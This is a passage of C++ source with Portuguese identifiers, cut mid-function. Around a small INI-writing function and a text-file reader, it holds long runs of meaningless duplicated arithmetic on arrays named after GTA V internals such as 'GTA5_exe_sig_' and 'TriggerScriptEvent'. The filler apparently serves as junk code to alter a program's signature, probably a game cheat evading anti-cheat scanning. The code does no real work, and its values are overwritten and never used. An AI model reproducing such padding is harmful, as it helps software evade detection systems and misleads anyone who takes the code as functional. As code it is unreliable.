				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				std::vector<float> TempVECTOR;
				ifstream imput(TXTFilePath);
				string textolido;
				for (string line; getline(imput, line);)
					TempVECTOR.push_back(stof(line));
				return TempVECTOR;
			}
		}
	};
	namespace INIFile
	{
		int PED_TO_NET_ = 2;
		int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		int offset = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		float a = 0.0f;
		float b = 0.0f;
		int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

		int ponteiro = 2;
		int aaaaaa = ponteiro * 2;
		int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		std::string INIFilePath;//Exemplo no mesmo diretorio do EXE:   .\\ArquivoINI.ini
		namespace String
		{
			int PED_TO_NET_ = 2;
			int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			int offset = (PED_TO_NET_ * 0xA) + 0xBB;
			int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			float a = 0.0f;
			float b = 0.0f;
			int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
			int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

			int ponteiro = 2;
			int aaaaaa = ponteiro * 2;
			int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			void GravarString(std::string string, std::string app, std::string key)
			{
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
